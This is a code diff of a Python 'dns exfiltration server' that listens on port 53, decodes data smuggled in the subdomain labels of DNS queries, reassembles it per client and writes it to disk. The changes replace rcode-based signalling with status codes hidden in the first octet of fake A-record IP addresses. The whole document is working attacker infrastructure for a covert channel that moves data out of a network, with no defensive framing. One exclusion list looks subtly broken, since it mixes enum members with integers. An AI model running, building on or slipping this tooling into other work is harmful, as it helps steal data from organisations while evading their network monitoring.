@@ -6,9 +6,16 @@ import time
 import dnslib as dns
 import argparse
 
-class PacketTypes(Enum):
-    START = 1  # A Record
-    DATA = 5  # CNAME Record
+class ReceivedPacketTypes(Enum):
+    START = 'a'
+    DATA = 'b'
+
+class SentPacketTypes(Enum):
+    OK = 200
+    MALFORMED = 201
+    NX = 202  # non-existant
+    OOO = 203  # out of order
+    MAX = 204  # reached max connection
 
 # thrown when packets should skip processing
 class ShortCircuitException(Exception):
@@ -104,35 +111,32 @@ class DataParserManager():
         for i in range(len(self.parsers)):
             parser: DataParser = self.parsers[i]
             parser.save_to_disk(save_path, i + 1)
+            
 
-
-def blank_response(response: dns.DNSRecord):
-    response.header.rcode = dns.RCODE.NOERROR
-    return request
-
-def nx_response(response: dns.DNSRecord):
-    response.header.rcode = dns.RCODE.NXDOMAIN
-    return request
-
-# send reconnect request
-def reconn_response(response: dns.DNSRecord):
-    response.header.rcode = dns.RCODE.REFUSED
-    return request
-
-# send request to reset packet number
-def reset_response(response: dns.DNSRecord):
-    response.header.rcode = dns.RCODE.FORMERR
-    return request
-
-def create_fake_ip(connections: int):  # generates a fake ip address that isn't reserved.
+def create_start_ip(connections: int):  # generates a fake ip address for connection responses
     if connections > 254:
         raise ServerMaxConnectionsException()
     fake = ""
-    fake += str(choice([i for i in range(1, 254) if i not in [0, 10, 100, 127, 169, 172, 192, 198, 203, 224, 233, 250, 255]]))
+    fake += str(choice([i for i in range(1, 254) if i not in [SentPacketTypes.OK, SentPacketTypes.MALFORMED, SentPacketTypes.NX, SentPacketTypes.OOO, 0, 10, 100, 127, 169, 172, 192, 198, 203, 224, 233, 250, 255]]))
     for i in range(2):
         fake += "." + str(choice(range(256)))
     fake += "." + str(connections + 1)
     return fake
+
+def create_response_ip(type: SentPacketTypes):  # generates a fake ip address for data responses
+    fake = f"{type.value}"
+    for i in range(3):
+        fake += "." + str(choice(range(256)))
+    return fake
+
+
+def create_response(ip: str, request: dns.DNSRecord):
+    response = dns.DNSRecord(dns.DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
+    response.add_answer(dns.RR(rname=str(request.q.qname), rtype=dns.QTYPE.A, rdata=dns.A(ip)))
+    for rdata in NS_RECORDS:
+        response.add_ar(dns.RR(rname=DOMAIN, rtype=dns.QTYPE.NS, rclass=1, ttl=3600, rdata=rdata))
+    response.add_ar(dns.RR(rname=DOMAIN, rtype=dns.QTYPE.SOA, rclass=1, ttl=3600, rdata=SOA_RECORD))
+    return response
 
 def index_of_2nd(string: str, sub: str):
     index = 0
@@ -154,16 +158,9 @@ def get_data(full: str, domain: str):
     if not (stripped.endswith(domain) or stripped.endswith("." + domain)):
         ## TODO: make it so things like eexample.com are not allowed
         raise ShortCircuitException()
-    if stripped.count('.') != 4:
+    if stripped.count('.') != 5:
         raise UnrelatedException()
     return full[:index_of_2nd(stripped, '.')]
-
-def form_skeleton(request: dns.DNSRecord):
-    response = dns.DNSRecord(dns.DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
-    for rdata in NS_RECORDS:
-        response.add_ar(dns.RR(rname=DOMAIN, rtype=dns.QTYPE.NS, rclass=1, ttl=3600, rdata=rdata))
-    response.add_ar(dns.RR(rname=DOMAIN, rtype=dns.QTYPE.SOA, rclass=1, ttl=3600, rdata=SOA_RECORD))
-    return response
 
 parser = argparse.ArgumentParser("dns exfiltration server")
 parser.add_argument('-p', '--port', help='port to listen on', type=int, default=53)
@@ -214,26 +211,24 @@ try:
         except Exception as e:
             print("Could not parse.")
             continue  # skip the rest of this loop
+
         # make generic response structure
-        response = form_skeleton(request)
+        response = dns.DNSRecord(dns.DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
         
         try:
             data = get_data(str(request.q.qname), DOMAIN)
-            if request.q.qtype == PacketTypes.START.value:
+            data_type = data.split('.', 1)[0]
+            rest = data.split('.', 1)[1]
+            if data_type == "a":
                 print(f"Starting connection: {data_parsers.number_of_connections()}")
-                # form response
-                response.header.rcode = dns.RCODE.NOERROR
-                # reply with fake IP address, but last octet is current # of connections, starting at 1
-                response.add_answer(dns.RR(rname=str(request.q.qname), rtype=dns.QTYPE.A, rdata=dns.A(create_fake_ip(data_parsers.number_of_connections()))))
+                response = create_response(create_start_ip(data_parsers.number_of_connections()), request)
                 data_parsers.add_parser(DataParser(addr[0]))
-            elif request.q.qtype == PacketTypes.DATA.value:
-                metadata = data_parsers.parse(data)
+            elif data_type == "b":
+                metadata = data_parsers.parse(rest)
                 print(f"Parsing data from {metadata[1]}")
-
-                # form response
-                response.header.rcode = dns.RCODE.NOERROR
-                domain = get_domain_from_full(str(request.q.qname))
-                response.add_answer(dns.RR(rname=str(request.q.qname), rtype=dns.QTYPE.CNAME, rdata=dns.CNAME(domain)))
+                response = create_response(create_response_ip(SentPacketTypes.OK), request)
+            else:
+                raise UnrelatedException()
         except ShortCircuitException as e:
             # do nothing and allow the blank response to be sent
             print("Short circuit: sending nothing.")
@@ -248,16 +243,16 @@ try:
                             response.add_answer(dns.RR(rname=str(request.q.qname), rtype=request.q.qtype, rclass=1, ttl=3600, rdata=rdata))
         except DNSSyntaxException as e:
             print("Improper syntax for DNS packet from " + addr[0] + "#" + str(addr[1]))
-            response = nx_response(response)
+            response = create_response(create_response_ip(SentPacketTypes.MALFORMED), request)
         except ServerMaxConnectionsException as e:
             print("Server has reached maximum number of concurrent connections from " + addr[0] + "#" + str(addr[1]))
-            response = nx_response(response)
+            response = create_response(create_response_ip(SentPacketTypes.MAX), request)
         except NXConnectionException as e:
             print("Connection does not exist from " + addr[0] + "#" + str(addr[1]))
-            response = reconn_response(response)
+            response = create_response(create_response_ip(SentPacketTypes.NX), request)
         except PacketsOutOfOrderException as e:
             print("Receiving out of order packets from " + addr[0] + "#" + str(addr[1]))
-            response = reset_response(response)
+            response = create_response(create_response_ip(SentPacketTypes.OOO), request)
         except Exception as e:
             print("Exception raised: " + str(e) + "\n from " + addr[0] + "#" + str(addr[1]))
         finally:
